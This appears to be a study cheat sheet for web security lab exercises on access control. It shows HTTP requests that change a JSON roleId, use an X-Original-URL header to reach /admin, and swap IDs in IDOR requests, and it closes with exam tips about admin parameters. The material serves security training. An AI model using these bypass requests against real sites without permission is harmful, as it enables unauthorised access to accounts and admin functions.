## 🎯 Overview

Access control vulnerabilities allow attackers to access resources or perform actions they shouldn't be authorized for.

## 🔥 Common Patterns

### Lab 1: User Role Modified in Profile
**Bypass:** JSON roleId manipulation

**Original Request:**
```http
POST /my-account HTTP/1.1
Content-Type: application/json

{
  "email": "user@example.com",
  "roleId": 1
}
```

**Exploit:**
```http
POST /my-account HTTP/1.1
Content-Type: application/json

{
  "email": "user@example.com",
  "roleId": 2
}
```

---

### Lab 2: URL-Based Access Control
**Bypass:** Change URL path or headers

**Bypass with X-Original-URL:**
```http
GET / HTTP/1.1
Host: vulnerable-site.com
X-Original-URL: /admin
```

---

### Lab 3: IDOR (Insecure Direct Object Reference)
**Bypass:** Change ID parameter

**Example:**
```http
GET /api/user/123/profile HTTP/1.1
```

Try:
```http
GET /api/user/1/profile HTTP/1.1
GET /api/user/admin/profile HTTP/1.1
```

## 🎓 Exam Tips

1. **Check JSON in profile updates** - Look for `roleId`, `isAdmin`
2. **Try X-Original-URL header** - Common bypass for URL-based controls
3. **Test IDOR on all ID parameters** - Try `1`, `admin`, `administrator`
4. **Add admin parameters** - `?admin=true`, `?isAdmin=1`

---
